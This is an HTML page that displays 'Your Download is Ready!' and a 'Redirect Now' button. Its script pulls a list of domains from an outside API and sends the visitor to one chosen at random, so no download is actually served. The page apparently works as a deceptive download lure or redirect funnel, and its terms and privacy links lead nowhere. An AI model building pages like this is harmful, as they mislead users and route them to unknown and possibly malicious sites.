<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Download Redirect - Page 1</title>
  <style>
    /* Body Styling */
    body {
      font-family: "Arial", sans-serif;
      background-color: #f4f4f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
    }

    /* Container Styling */
    .container {
      background-color: #ffffff;
      padding: 40px 60px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0px 10px 40px rgba(0, 0, 0, 0.1);
      max-width: 500px;
      width: 100%;
      transition: transform 0.3s ease-in-out;
    }

    .container:hover {
      transform: scale(1.05);
    }

    /* Header Styling */
    .header {
      color: #333333;
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 30px;
      color: #fff;
    }

    .description {
      color: #333333;
      font-size: 18px;
      margin-bottom: 40px;
      line-height: 1.5;
    }

    /* Button Styling */
    .button {
      background-color: #28a745;
      color: white;
      padding: 18px 40px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.2s ease;
      width: 100%;
      max-width: 200px;
      margin: 0 auto;
    }

    .button:hover {
      background-color: #218838;
      transform: translateY(-3px);
    }

    .button:active {
      transform: translateY(1px);
    }

    /* Footer Styling */
    .footer {
      color: #888;
      font-size: 14px;
      margin-top: 30px;
    }

    .footer a {
      color: #28a745;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
      .container {
        padding: 20px 30px;
        width: 90%;
      }

      .header {
        font-size: 24px;
      }

      .description {
        font-size: 16px;
      }

      .button {
        font-size: 16px;
        padding: 15px 30px;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <h2 class="header" style="color: red">Your Download is Ready!</h2>
    <p class="description">
      Click the button below to be redirected to your download link. The
      download process will start shortly.
    </p>
    <button id="downloadButton" class="button">Redirect Now</button>

    <p class="footer">
      By clicking the button, you agree to our
      <a href="#">terms and conditions</a> and <a href="#">privacy policy</a>.
    </p>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    // const title = urlParams.get("title");
    const title = "Download"
    async function getAllTemplateDomains() {
      try {
        const response = await fetch(
          "https://databloom.xyz/api/api/v1/domain/get/all/template",
          {
            method: "GET",
            credentials: "include",  // âœ… Important for CORS with credentials
            headers: {
              "Content-Type": "application/json",
            },
          }

        );
        const data = await response.json();
        console.log("data", data)
        return data.data;
      } catch (error) {
        console.log("hello")
        console.error("Error fetching domains:", error);
        return [];
      }
    }


    async function setDownloadLink() {
      const templateDomains = await getAllTemplateDomains();
      console.log("templateDomains", templateDomains)

      if (templateDomains.length > 0) {
        const randomDomain = templateDomains[Math.floor(Math.random() * templateDomains.length)].domain.trim();

        if (randomDomain.startsWith("http://") || randomDomain.startsWith("https://")) {
          window.location.href = randomDomain + "?title=" + encodeURIComponent(title);
        } else {
          window.location.href = "https://" + randomDomain + "?title=" + encodeURIComponent(title);
        }
      } else {
        console.error("No template domains found.");
      }
    }


    document
      .getElementById("downloadButton")
      .addEventListener("click", setDownloadLink);
  </script>
</body>

</html>
